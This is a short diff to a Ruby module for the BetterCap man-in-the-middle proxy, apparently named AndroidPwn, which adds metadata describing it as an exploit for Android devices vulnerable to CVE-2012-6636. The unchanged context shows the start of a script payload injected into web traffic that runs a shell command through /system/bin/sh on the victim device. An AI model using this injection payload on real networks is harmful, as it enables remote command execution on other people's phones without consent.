@@ -10,6 +10,14 @@ This project is released under the GPL 3 license.
 
 =end
 class AndroidPwn < BetterCap::Proxy::HTTP::Module
+  meta(
+    'Name'        => 'AndroidPwn',
+    'Description' => 'Exploits Android devices that are vulnerable to CVE-2012-6636 .',
+    'Version'     => '1.0.0',
+    'Author'      => "Simone 'evilsocket' Margaritelli",
+    'License'     => 'GPL3'
+  )
+
   @@command = nil
   @@payload = "<script>\n" +
               "var command = ['/system/bin/sh','-c','COMMAND_HERE'];\n" +
